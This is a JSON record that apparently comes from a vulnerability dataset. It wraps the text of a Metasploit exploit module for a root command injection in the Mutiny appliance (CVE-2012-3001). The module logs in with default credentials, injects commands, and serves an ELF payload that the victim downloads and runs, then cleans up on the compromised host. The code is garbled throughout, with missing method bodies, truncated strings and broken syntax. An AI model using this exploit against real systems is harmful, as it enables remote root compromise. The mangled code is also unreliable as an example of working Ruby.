{
    "text": "vul_name : Mutiny Remote Command Execution ， vul_cve : CVE-2012-3001 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HttpServer ， include Msf : Exploit : EXE ， super ( update_info ( info ,  ， 'Name' => 'Mutiny Remote Command Execution' ,  ， 'Description' => %q{ ， This module exploits an authenticated command injection vulnerability in the ， Mutiny appliance. Versions prior to 4.5-1.12 are vulnerable. In order to exploit ， the vulnerability the mutiny user must have access to the admin interface. The ， injected commands are executed with root privileges. This module has been tested ， successfully on Mutiny 4.2-1.05. ， } ,  ， 'Author' => ，  [  ， 'Christopher Campbell' ,  # Vulnerability discovery ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2012-3001' ]  ,  ，  [ 'OSVDB' , '86570' ]  ,  ，  [ 'BID' , '56165' ]  ,  ，  [ 'US-CERT-VU' , '841851' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Privileged' => true ,  ， 'Platform' => [ 'unix' , 'linux' ]  ,  ， 'Payload' => ， { ， 'DisableNops' => true ,  ， 'Space' => 4000 ， } ,  ， 'Targets' => ，  [  ，  [ 'Unix CMD' ,  ， { ， 'Arch' => ARCH_CMD ,  ， 'Platform' => 'unix' ,  ，  # 'Payload' => ，  # { ，  # 'Compat' => ，  # { ，  # 'PayloadType' => 'cmd' ,  ，  # 'RequiredCmd' => 'python' ，  # } ，  # } ,  ， } ，  ]  ,  ，  [ 'Linux Payload' ,  ， { ， 'Arch' => ARCH_X86 ,  ， 'Platform' => 'linux' ， } ，  ]  ，  ]  ,  ， 'DisclosureDate' => 'Oct 22 2012' ,  ， 'DefaultTarget' => 1 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path to Mutiny' , '/interface/' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ true , 'The user to authenticate as' , 'admin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'The password to authenticate with' , 'mutiny' ]  )  ，  ]  , self.class )  ， end ， def peer ， \" # {rhost} :  # {rport}\" ， end ，  # Get the source address ， Rex : Socket.source_address ( '50.50.50.50' )  ， datastore [ 'SRVHOST' ]  ， end ， end ， cmds = [  ]  ， cmds = [  ， %Q | echo # { @ netmask_eth0} > /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask |  ,  ， %Q | tr -d \"\\n\\r\" < /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask > /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask.bak |  ,  ， %Q | mv -f /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask.bak /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask |  ,  ， %Q | sed -e s/NETMASK=. * /NETMASK= # { @ netmask_eth0}/ ifcfg-eth0 > ifcfg-eth0.bak |  ,  ， %Q | mv -f ifcfg-eth0.bak ifcfg-eth0 |  ,  ， %Q | /etc/init.d/network restart |  ，  ] unless not @ netmask_eth0 ， cmds %Q | rm /tmp/ # { @ elfname}.elf | unless target.name = ~ /CMD/ ， print_status ( \" # {peer} - Restoring Network Information and Cleanup.\" )  ， begin ， session.shell_command_token ( cmds.join ( \" ; \" )  ， rescue ， print_error ( \" # {peer} - Automatic restore and cleanup didn't work , please use these commands : \" )  ， cmds.each { | cmd |  ， print_warning ( cmd )  ， } ， end ， print_good ( \" # {peer} - Restoring and Cleanup successful\" )  ， end ， def start_web_service ， print_status ( \" # {peer} - Setting up the Web Service.\" )  ， ssl_restore = true ， datastore [ 'SSL' ] = false ， end ， resource_uri = '/' + @ elfname + '.elf' ， service_url = \" ， print_status ( \" # {peer} - Starting up our web service on # {service_url} .\" )  ， start_service ( {'Uri' => { ， 'Proc' => Proc.new { | cli , req |  ， on_request_uri ( cli , req )  ， } ,  ， 'Path' => resource_uri ， } )  ， datastore [ 'SSL' ] = true if ssl_restore ， end ，  # wait for the data to be sent ， def wait_linux_payload ， print_status ( \" # {peer} - Waiting for the victim to request the ELF payload.\" )  ， waited = 0 ， select ( nil , nil , nil , 1 )  ， waited += 1 ， fail_with ( Exploit : Failure : Unknown , \"Target didn't request request the ELF payload - Maybe it cant connect back to us?\" )  ， end ， end ，  # print_status ( \" # {peer} - Giving time to the payload to execute.\" )  ，  # select ( nil , nil , nil , 20 ) unless session_created? ， print_status ( \" # {peer} - Shutting down the web service.\" )  ， stop_service ， end ，  # Handle incoming requests from the target ， vprint_status ( \" # {peer} - on_request_uri called ,  # {request} requested\" )  ， print_error ( \" # {peer} - A request came in , but the ELF archive wasn't ready yet ! \" )  ， end ， print_good ( \" # {peer} - Sending the ELF payload to the target.\" )  ，  @ elf_sent = true ， send_response ( cli ,  @ elf_data )  ， end ， def check ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'logon.jsp' )  ,  ， } ) ",
    "time": "2013.03.23"
}